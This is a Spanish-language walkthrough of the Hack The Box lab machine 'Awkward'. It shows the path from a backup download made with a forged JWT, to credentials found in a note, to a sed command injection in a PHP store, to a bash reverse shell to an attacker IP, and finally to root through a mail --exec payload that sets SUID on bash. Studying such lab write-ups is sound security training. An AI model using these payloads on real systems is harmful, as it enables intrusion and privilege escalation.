![imagen 32](Pasted image 20230225115900.png)

Tras mucha enumeración del sistema, encontramos en el *bashrc* del usuario *bean* una línea interesante:

![imagen 33](Pasted image 20230225120045.png)

El archivo completo es el siguiente y lo podemos encontrar en */home/bean/.bashrc*:

```bash
## ~/.bashrc: executed by bash(1) for non-login shells.
## see /usr/share/doc/bash/examples/startup-files (in the package bash-doc)
## for examples

## If not running interactively, don't do anything
case $- in
    *i*) ;;
      *) return;;
esac

## don't put duplicate lines or lines starting with space in the history.
## See bash(1) for more options
HISTCONTROL=ignoreboth

## append to the history file, don't overwrite it
shopt -s histappend

## for setting history length see HISTSIZE and HISTFILESIZE in bash(1)
HISTSIZE=1000
HISTFILESIZE=2000

## check the window size after each command and, if necessary,
## update the values of LINES and COLUMNS.
shopt -s checkwinsize

## If set, the pattern "**" used in a pathname expansion context will
## match all files and zero or more directories and subdirectories.
#shopt -s globstar

## make less more friendly for non-text input files, see lesspipe(1)
[ -x /usr/bin/lesspipe ] && eval "$(SHELL=/bin/sh lesspipe)"

## set variable identifying the chroot you work in (used in the prompt below)
if [ -z "${debian_chroot:-}" ] && [ -r /etc/debian_chroot ]; then
    debian_chroot=$(cat /etc/debian_chroot)
fi

## set a fancy prompt (non-color, unless we know we "want" color)
case "$TERM" in
    xterm-color|*-256color) color_prompt=yes;;
esac

## uncomment for a colored prompt, if the terminal has the capability; turned
## off by default to not distract the user: the focus in a terminal window
## should be on the output of commands, not on the prompt
#force_color_prompt=yes

if [ -n "$force_color_prompt" ]; then
    if [ -x /usr/bin/tput ] && tput setaf 1 >&/dev/null; then
	## We have color support; assume it's compliant with Ecma-48
	## (ISO/IEC-6429). (Lack of such support is extremely rare, and such
	## a case would tend to support setf rather than setaf.)
	color_prompt=yes
    else
	color_prompt=
    fi
fi

if [ "$color_prompt" = yes ]; then
    PS1='${debian_chroot:+($debian_chroot)}\[\033[01;32m\]\u@\h\[\033[00m\]:\[\033[01;34m\]\w\[\033[00m\]\$ '
else
    PS1='${debian_chroot:+($debian_chroot)}\u@\h:\w\$ '
fi
unset color_prompt force_color_prompt

## If this is an xterm set the title to user@host:dir
case "$TERM" in
xterm*|rxvt*)
    PS1="\[\e]0;${debian_chroot:+($debian_chroot)}\u@\h: \w\a\]$PS1"
    ;;
*)
    ;;
esac

## enable color support of ls and also add handy aliases
if [ -x /usr/bin/dircolors ]; then
    test -r ~/.dircolors && eval "$(dircolors -b ~/.dircolors)" || eval "$(dircolors -b)"
    alias ls='ls --color=auto'
    #alias dir='dir --color=auto'
    #alias vdir='vdir --color=auto'

    alias grep='grep --color=auto'
    alias fgrep='fgrep --color=auto'
    alias egrep='egrep --color=auto'
fi

## colored GCC warnings and errors
#export GCC_COLORS='error=01;31:warning=01;35:note=01;36:caret=01;32:locus=01:quote=01'

## some more ls aliases
alias ll='ls -alF'
alias la='ls -A'
alias l='ls -CF'

## custom
alias backup_home='/bin/bash /home/bean/Documents/backup_home.sh'

## Add an "alert" alias for long running commands.  Use like so:
##   sleep 10; alert
alias alert='notify-send --urgency=low -i "$([ $? = 0 ] && echo terminal || echo error)" "$(history|tail -n1|sed -e '\''s/^\s*[0-9]\+\s*//;s/[;&|]\s*alert$//'\'')"'

## Alias definitions.
## You may want to put all your additions into a separate file like
## ~/.bash_aliases, instead of adding them here directly.
## See /usr/share/doc/bash-doc/examples in the bash-doc package.

if [ -f ~/.bash_aliases ]; then
    . ~/.bash_aliases
fi

## enable programmable completion features (you don't need to enable
## this, if it's already enabled in /etc/bash.bashrc and /etc/profile
## sources /etc/bash.bashrc).
if ! shopt -oq posix; then
  if [ -f /usr/share/bash-completion/bash_completion ]; then
    . /usr/share/bash-completion/bash_completion
  elif [ -f /etc/bash_completion ]; then
    . /etc/bash_completion
  fi
fi
```

El comando `alias backup_home='/bin/bash /home/bean/Documents/backup_home.sh'` se utiliza para crear un alias de línea de comandos en el sistema operativo Linux o Unix.

En este caso, el alias se llama *backup_home* y está asociado con la ruta */bin/bash /home/bean/Documents/backup_home.sh*. Cuando se ingresa el comando *backup_home* en la línea de comandos, el sistema operativo ejecutará el script */home/bean/Documents/backup_home.sh* utilizando el intérprete de shell */bin/bash*.

El contenido de */home/bean/Documents/backup_home.sh* es el siguiente:

```bash
#!/bin/bash
mkdir /home/bean/Documents/backup_tmp
cd /home/bean
tar --exclude='.npm' --exclude='.cache' --exclude='.vscode' -czvf /home/bean/Documents/backup_tmp/bean_backup.tar.gz .
date > /home/bean/Documents/backup_tmp/time.txt
cd /home/bean/Documents/backup_tmp
tar -czvf /home/bean/Documents/backup/bean_backup_final.tar.gz .
rm -r /home/bean/Documents/backup_tmp
```

Básicamente, en */home/bean/Documents/backup/* encontraremos un **archivo comprimido** llamado *bean_backup_final.tar.gz*, que contendrá un *backup* del *homedir* del usuario *bean* y un fichero con la fecha en la que se ha hecho el *backup*. Lo descargaremos con el siguiente comando:

```bash
curl http://hat-valley.htb/api/all-leave -H 'Cookie: token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6Ii8nIC9ob21lL2JlYW4vRG9jdW1lbnRzL2JhY2t1cC9iZWFuX2JhY2t1cF9maW5hbC50YXIuZ3ogJy8iLCJpYXQiOjE2NzcyODA0MzR9.mbvULHVsGQ9nZFmHnz4Teesl6a5_eDxr8QkbvzobBWM' > bean_backup_final.tar.gz 
```

Previamente, forjaremos una *cookie* del siguiente modo:

![imagen 34](Pasted image 20230225123720.png)

### Investigando bean_backup_final.tar.gz 

Descomprimimos el archivo y deberíamos tener acceso a la siguiente información:

![imagen 35](Pasted image 20230225123841.png)

En el directorio  *.config/xpad/content-DS1ZS1* encontraremos la siguiente nota:

```bash
TO DO:
- Get real hat prices / stock from Christine
- Implement more secure hashing mechanism for HR system
- Setup better confirmation message when adding item to cart
- Add support for item quantity > 1
- Implement checkout system

boldHR SYSTEM/bold
bean.hill
014mrbeanrules!#P

https://www.slac.stanford.edu/slac/www/resource/how-to-use/cgi-rexx/cgi-esc.html

boldMAKE SURE TO USE THIS EVERYWHERE ^^^/bold
```

*Xpad* es una aplicación de notas adhesivas (post-it) para el sistema operativo *Linux*. Es una aplicación de escritorio que se puede utilizar para crear, editar y administrar notas adhesivas en el escritorio del sistema operativo.

Vemos unas credenciales en esta nota: *bean.hill:014mrbeanrules!#P*. Las utilizaremos para autenticarnos como el usuario *bean* por *SSH*:

![imagen 37](Pasted image 20230225124229.png)

### user.txt

Encontraremos la primera *flag* en el *homedir* del usuario *bean*:

```bash
bean@awkward:~$ cat user.txt 
d57ef19a6e43d3158693e38dd90f310b
```

## Consiguiendo shell como www-data

### Reconocimiento del sistema

#### Consiguiendo credenciales de acceso a store.hat-valley.htb

Recordemos que para acceder a http://store.hat-valley.htb necesitábamos autenticarnos. Podemos mirar si se las credenciales se encuentran en los archivos de configuración de *nginx*. La ruta de configuración de los diferentes dominios se encuentra en */etc/nginx/sites-available/*:

![imagen 38](Pasted image 20230225125346.png)

En este caso, nos interesa el archivo *store.conf*. Su contenido es el siguiente:

```bash
bean@awkward:/etc/nginx/sites-available$ cat store.conf 
server {
    listen       80;
    server_name  store.hat-valley.htb;
    root /var/www/store;

    location / {
        index index.php index.html index.htm;
    }
    ## pass the PHP scripts to FastCGI server listening on 127.0.0.1:9000
    #
    location ~ /cart/.*\.php$ {
	return 403;
    }
    location ~ /product-details/.*\.php$ {
	return 403;
    }
    location ~ \.php$ {
        auth_basic "Restricted";
        auth_basic_user_file /etc/nginx/conf.d/.htpasswd;
        fastcgi_pass   unix:/var/run/php/php8.1-fpm.sock;
        fastcgi_index  index.php;
        fastcgi_param  SCRIPT_FILENAME  $realpath_root$fastcgi_script_name;
        include        fastcgi_params;
    }
    ## deny access to .htaccess files, if Apache's document root
    ## concurs with nginx's one
    #
    #location ~ /\.ht {
    ##    deny  all;
    #}
}
```

Las credenciales se están guardando en el fichero */etc/nginx/conf.d/.htpasswd*:

```bash
bean@awkward:/etc/nginx/sites-available$ cat /etc/nginx/conf.d/.htpasswd 
admin:$apr1$lfvrwhqi$hd49MbBX3WNluMezyjWls1
```

El usuario que se utiliza para autenticarse en http://store.hat-valley.htb es *admin*, pero la contraseña está *hasheada*. La podríamos intentar romper, pero la contraseña es bastante robusta y, por tanto, no lo conseguiremos. Podemos verificar si se está aplicando reutilización de credenciales utilizando la contraseña de *bean.hill* o *christopher.jones*. Las credenciales correctas serán `admin:014mrbeanrules!#P`. 

#### inspeccionando http://store.hat-valley.htb 

La tienda tiene el siguiente aspecto:

![imagen 39](Pasted image 20230225130022.png)

Antes de intentar explotar vulnerabilidades a ciegas, como estamos dentro de la máquina y tenemos acceso a los archivos de configuración de http://store.hat-valley.htb, vamos a inspeccionarlos. Los archivos se encuentran en la ruta */var/www/html*:

![imagen 49](Pasted image 20230225130324.png)

*cart_actions.php* contiene todas las **acciones** que se pueden realizar en la web. Su contenido es el siguiente:

```php
<?php

$STORE_HOME = "/var/www/store/";

//check for valid hat valley store item
function checkValidItem($filename) {
    if(file_exists($filename)) {
        $first_line = file($filename)[0];
        if(strpos($first_line, "***Hat Valley") !== FALSE) {
            return true;
        }
    }
    return false;
}

//add to cart
if ($_SERVER['REQUEST_METHOD'] === 'POST' && $_POST['action'] === 'add_item' && $_POST['item'] && $_POST['user']) {
    $item_id = $_POST['item'];
    $user_id = $_POST['user'];
    $bad_chars = array(";","&","|",">","<","*","?","`","$","(",")","{","}","[","]","!","#"); //no hacking allowed!!

    foreach($bad_chars as $bad) {
        if(strpos($item_id, $bad) !== FALSE) {
            echo "Bad character detected!";
            exit;
        }
    }

    foreach($bad_chars as $bad) {
        if(strpos($user_id, $bad) !== FALSE) {
            echo "Bad character detected!";
            exit;
        }
    }

    if(checkValidItem("{$STORE_HOME}product-details/{$item_id}.txt")) {
        if(!file_exists("{$STORE_HOME}cart/{$user_id}")) {
            system("echo '***Hat Valley Cart***' > {$STORE_HOME}cart/{$user_id}");
        }
        system("head -2 {$STORE_HOME}product-details/{$item_id}.txt | tail -1 >> {$STORE_HOME}cart/{$user_id}");
        echo "Item added successfully!";
    }
    else {
        echo "Invalid item";
    }
    exit;
}

//delete from cart
if ($_SERVER['REQUEST_METHOD'] === 'POST' && $_POST['action'] === 'delete_item' && $_POST['item'] && $_POST['user']) {
    $item_id = $_POST['item'];
    $user_id = $_POST['user'];
    $bad_chars = array(";","&","|",">","<","*","?","`","$","(",")","{","}","[","]","!","#"); //no hacking allowed!!

    foreach($bad_chars as $bad) {
        if(strpos($item_id, $bad) !== FALSE) {
            echo "Bad character detected!";
            exit;
        }
    }

    foreach($bad_chars as $bad) {
        if(strpos($user_id, $bad) !== FALSE) {
            echo "Bad character detected!";
            exit;
        }
    }
    if(checkValidItem("{$STORE_HOME}cart/{$user_id}")) {
        system("sed -i '/item_id={$item_id}/d' {$STORE_HOME}cart/{$user_id}");
        echo "Item removed from cart";
    }
    else {
        echo "Invalid item";
    }
    exit;
}

//fetch from cart
if ($_SERVER['REQUEST_METHOD'] === 'GET' && $_GET['action'] === 'fetch_items' && $_GET['user']) {
    $html = "";
    $dir = scandir("{$STORE_HOME}cart");
    $files = array_slice($dir, 2);

    foreach($files as $file) {
        $user_id = substr($file, -18);
        if($user_id === $_GET['user'] && checkValidItem("{$STORE_HOME}cart/{$user_id}")) {
            $product_file = fopen("{$STORE_HOME}cart/{$file}", "r");
            $details = array();
            while (($line = fgets($product_file)) !== false) {
                if(str_replace(array("\r", "\n"), '', $line) !== "***Hat Valley Cart***") { //don't include first line
                    array_push($details, str_replace(array("\r", "\n"), '', $line));
                }
            }
            foreach($details as $cart_item) {
                 $cart_items = explode("&", $cart_item);
                 for($x = 0; $x < count($cart_items); $x++) {
                      $cart_items[$x] = explode("=", $cart_items[$x]); //key and value as separate values in subarray
                 }
                 $html .= "<tr><td>{$cart_items[1][1]}</td><td>{$cart_items[2][1]}</td><td>{$cart_items[3][1]}</td><td><button data-id={$cart_items[0][1]} onclick=\"removeFromCart(this, localStorage.getItem('user'))\" class='remove-item'>Remove</button></td></tr>";
            }
        }
    }
    echo $html;
    exit;
}

?>
```

* *add to cart* recibe tres valores por POST: *action*, *item* y *user*. *action* deve valer *add_item* y *item* y *user* son **sanitizados** para evitar cualquier tipo de inyección de código malicioso. **Si el ítem existe**, éste se añade al carrito del usuario. La petición se ve así:

![imagen 50](Pasted image 20230225131133.png)

Tanto *item* como *user* son utilizados para ejecutar un comando a nivel de sistema:

```bash
head -2 {$STORE_HOME}product-details/{$item_id}.txt | tail -1 >> {$STORE_HOME}cart/{$user_id}
```

Este comando toma el contenido de la segunda línea del archivo *{\$STORE_HOME}product-details/{\$item_id}.txt* y lo agrega al final del archivo *{\$STORE_HOME}cart/{\$user_id}*. Podríamos modificar el *user* por un valor malicioso que nos almacenase el contenido de la segunda línea del archivo *{\$STORE_HOME}product-details/{\$item_id}.txt* en otro archivo del sistema, del siguiente modo:

![imagen 51](Pasted image 20230225132141.png)

Nos crea en */dev/shm* un archivo *item.txt* con el siguiente contenido:

```bash
bean@awkward:/var/www/store$ cat /dev/shm/item.txt 
***Hat Valley Cart***
item_id=3&item_name=Straw Hat&item_brand=Sunny Summer&item_price=$70.00
```

A parte de esto, poca cosa mas podremos hacer.

* *delete from cart* recibe también tres parámetros por POST: *item*, *user* y *action*. El valor de *action* debe ser *delete_item* y *item* y *user*  son sanitizados para evitar cualquier tipo de inyección de código malicioso. **Si el usuario tiene un carrito**, se ejecuta un comando a nivel de sistema para borrar el item del carrito. La petición se ve así:

![imagen 52](Pasted image 20230225132802.png)

Tanto *item* como *user* son utilizados para ejecutar un comando a nivel de sistema:

```bash
sed -i '/item_id={$item_id}/d' {$STORE_HOME}cart/{$user_id}
```

El comando `sed` se utiliza para editar archivos de texto desde la línea de comandos. En este caso, el comando específico utiliza la opción `-i` para editar el archivo de entrada directamente. La expresión regular `/item_id={$item_id}/d` se utiliza para buscar y eliminar líneas que coincidan con una cadena literal específica. La ruta al archivo que se va a editar se especifica utilizando `{$STORE_HOME}cart/{$user_id}`. El resultado final es que `sed` eliminará las líneas que coincidan con la expresión regular en el archivo especificado.

Aquí las cosas ya cambian respeco a *add to cart*, ya que se está utilizando *sed* y existe una forma de ejecutar comandos con esta herramienta. En [GTFObins](https://gtfobins.github.io/gtfobins/sed/#command) podemos encontrar el modo de hacerlo. El comando es:

```bash
sed -n '1e id' /etc/hosts
```

**La sanitización de caracteres no contempla ni el guión, ni la comilla simple, ni la barra**. Otra combinación de parámetros para ejecutar comandos con *sed* es:

```bash
sed -e '1e id' /etc/hosts
```

La diferencia entre los comandos `sed -n '1e id' /etc/hosts` y `sed -e '1e id' /etc/hosts` es que la opción `-n` en el primer comando suprime la salida predeterminada de `sed`, mientras que en el segundo comando, la salida predeterminada se imprimirá en la salida estándar del terminal.

Por ejemplo, en mi máquina obtengo el siguiente resultado al ejecutar los dos comandos:

![imagen 53](Pasted image 20230225140815.png)

Por lo tanto, se puede acontecer una ejecución de comandos en el parámetro *item* de *delete from cart*.

##### Inyección de comandos de delete from cart

Por si alguien se lo pregunta, solo podremos inyectar comandos en el parámetro *item*, ya que *user* tiene que ser un valor de usuario que exista. 

Nos intentaremos enviar una *reverse shell* con uno de los comandos descritos anteriormente. Creamos un fichero *pwned.sh* en *tmp* con el siguiente contenido:

```bash
bash -c "bash -i >& /dev/tcp/10.10.14.130/443 0>&1"
```

Tanto la IP como el puerto deben de ir acordes a la IP que tenemos asignada y al puerto donde queramos recibir la *reverse shell*. **Es importante dar permisos de ejecución** a *pwned.sh*.

Utilizaremos la opción de *sed* que emplea el parámetro *-e*, ya que la opción con *-n* no funciona. El *payload* será el siguiente:

```bash
' -e "1e /tmp/pwned.sh" /tmp/pwned.sh '
```

El comando que ejecutaría el sistema sería el siguiente:

```bash
sed -i '/item_id=' -e "1e /tmp/pwned.sh" /tmp/pwned.sh '/d' /var/www/store/cart/8be9-1e49-ceb-3818
```

Por tanto, interceptamos una petición y modificamos el valor de *item*:

![imagen 54](Pasted image 20230224001342.png)

Antes de enviar la petición, nos pondremos en escucha con *netcat* por el puerto 443, en mi caso:

![imagen 55](Pasted image 20230225142209.png)

Enviamos la petición y deberíamos de recibir una *shell*:

![imagen 56](Pasted image 20230225142552.png)

Le haremos un tratamiento a la consola para hacerla más interactiva. Esto significa poder hacer *Ctrl+C* sin perder la *shell*, limpiar los comandos, movernos con las flechas… Escribiremos la siguiente secuencia de comandos:

```bash
script /dev/null -c bash
*CTRL+Z*
stty raw -echo;fg
reset xterm
export TERM=xterm
export SHELL=bash
```

También deberíamos ajustar el número de filas y de columnas. Con el comando *stty size* podremos consultar las filas y columnas de nuestra consola y con el comando *stty rows \<n.filas\> cols \<n.columnas\>* podremos ajustar estos campos en la *shell* recibida.

## Consiguiendo shell como root

### Reconocimiento del sistema con pspy

**_Pspy_** es una herramienta que nos permite ver qué tareas se están ejecutando a intervalos regulares de tiempo y por qué usuarios. Nos la podemos descargar del siguiente [repositorio](https://github.com/DominicBreuker/pspy).

El programa se puede transferir a la máquina víctima desplegando un servidor en _python_ `(python3 -m http.server 80)` compartiendo el fichero y luego en la máquina víctima en un directorio donde tengamos permisos de escritura (como _/tmp_ o _/dev/shm_) hacer un _wget_ para descargar el archivo.

Cada cierto tiempo se están ejecutando las siguiente tareas por el usuario ***root***:

![imagen 57](Pasted image 20230225143435.png)

Este usuario está ejecutando un archivo llamado *notify.sh*, que contiene el comando `inotifywait --quiet --monitor --event modify /var/www/private/leave_requests.csv`

Este comando **monitorea** el archivo `/var/www/private/leave_requests.csv` para detectar eventos de modificación. Los parámetros que se utilizan son los siguientes:

-   `--quiet`: esta opción le dice a `inotifywait` que no imprima mensajes de registro en la salida estándar del terminal.
-   `--monitor`: esta opción indica que se mantendrá el monitoreo en ejecución de manera continua hasta que se interrumpa manualmente con `Ctrl-C`.
-   `--event modify`: esta opción indica que `inotifywait` solo debe informar sobre eventos de modificación en el archivo `/var/www/private/leave_requests.csv`.

*/var/www/private/leave_requests.csv* contiene las solicitudes subidas por los usuarios en http://hat-valley.htb/leave:

![imagen 58](Pasted image 20230225144246.png)

Cuando subimos un nuevo comentario, se ejecutan los siguientes comandos por detrás:

![imagen 59](Pasted image 20230225145426.png)


Cuando se produce una modificación en el archivo */var/www/private/leave_requests.csv*, el usuario *root* envía un correo electrónico con el asunto *Leave Request* al destinatario *christine* con el nombre *christopher.jones*.

Para obtener el valor de **christopher.jones**, previamente se ejecuta un *awk* para obtener este valor del archivo */var/www/private/leave_requests.csv*. 

En el primer punto del **Anexo**, estudiamos con mas detenimiento el *script* *notify.sh*.

Vamos a añadir en el archivo *leave_requests.csv* la cadena *test*. El usuario *root* debería enviar un correo electrónico con las siguientes características:

```bash
mail -s Leave Request: test christine 
```

El resultado es el siguiente:

![imagen 60](Pasted image 20230225150800.png)

Efectivamente, se envía un correo con los valores anteriormente descritos. [GTFObins](https://gtfobins.github.io/gtfobins/mail/) nos presenta un parámetro para poder ejecutar comandos con la herramienta *mail*:

```bash
mail --exec='!/bin/sh'
```

El comando que ejecutaremos será `chmod u+s /bin/bash`. Al ser ejecutado por *root*, este comando asignará permisos SUID a la *bash*, pudiéndonos posteriormente *spawnearnos* una consola como *root*.

Crearemos un archivo en */tmp* llamado *pwned.sh* con el siguiente contenido:

```bash
chmod u+s /bin/bash
```

Posteriormente, ejecutaremos el siguiente comando:

```bash
echo 'test --exec="!/tmp/pwned"' >> /var/www/private/leave_requests.csv
```

Una vez ejecutado, el usuario *root* debería ejecutar la siguiente secuencia de comandos:

![imagen 61](Pasted image 20230225152733.png)

Miramos los permisos de la *bash*:

```bash
www-data@awkward:~/private$ ls -la /bin/bash
-rwsr-xr-x 1 root root 1396520 Jan  7  2022 /bin/bash
```

Se le han asignado permisos SUID. Con el comando `bash -p` nos podremos *spawnear* una *shell* como *root*:

![imagen 62](Pasted image 20230225152910.png)

### root.txt

La segunda *flag* se encuentra en el *homedir* de *root*:

```bash
bash-5.1## cat /root/root.txt 
ce61b62d278c54b4a778254167fb6c07
```

## Anexo

### Investigando notify.sh

Este es el contenido del *script* *notify.sh*, ejecutado por *root*, que se encarga de enviar un correo electrónico cuando se produce un cambio en el archivo *leave_requests.csv*, es decir, cuando se sube un nuevo comentario en *http://hat-valley.htb/leave*:

```bash
bash-5.1## cat notify.sh 
#!/bin/bash

inotifywait --quiet --monitor --event modify /var/www/private/leave_requests.csv | while read; do
	change=$(tail -1 /var/www/private/leave_requests.csv)
	name=`echo $change | awk -F, '{print $1}'`
	echo -e "You have a new leave request to review!\n$change" | mail -s "Leave Request: "$name christine
done
```

El *script* espera a que se produzcan cambios en el archivo `/var/www/private/leave_requests.csv` utilizando el comando `inotifywait`. Cuando se produce un cambio, el *script* lee la última línea del archivo utilizando el comando `tail`, extrae el nombre de la persona que ha hecho la solicitud de permiso utilizando el comando `awk`, y luego envía un correo electrónico a una persona llamada *Christine* utilizando el comando `mail`.